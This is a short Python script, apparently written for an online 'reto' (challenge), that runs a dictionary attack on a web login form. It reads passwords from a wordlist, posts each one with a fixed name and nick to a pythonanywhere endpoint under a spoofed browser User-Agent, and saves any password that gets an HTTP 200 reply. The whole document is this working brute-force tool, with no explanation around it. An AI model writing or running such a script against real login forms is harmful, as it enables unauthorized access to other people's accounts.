import urllib.request as rq
import urllib.parse
from urllib.error import HTTPError

url = 'http://xl666.pythonanywhere.com/reto/'
headers = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}

tentativa = 0

with open('test-list.txt') as archivo:
    for line in archivo:
        line = line.replace(" ", "").replace("\n", "")

        data = { 'nombre' : 'Caio Augusto Barreto do Amaral', 'nick' : 'pepe', 'pass' : line }
        data = urllib.parse.urlencode(data)
        data = data.encode('utf-8')
        
        request = rq.Request(url, data=data, headers=headers)

        tentativa = tentativa + 1

        try:            
            response = rq.urlopen(request)
            
            if response.code == 200:
                print("Attempt " + str(tentativa) + "> " + line + " - Sucess (" + str(response.code) + ")\n\n")
                with open('contrasena.txt', 'w') as contrasena:
                    contrasena.write("Attempt " + str(tentativa) + "> " + line + " - Sucess (" + str(response.code) + ")\n\n")
        except HTTPError as error:
            print("Attempt " + str(tentativa) + "> " + line + " - Failed (" + str(error.code) + ")\n")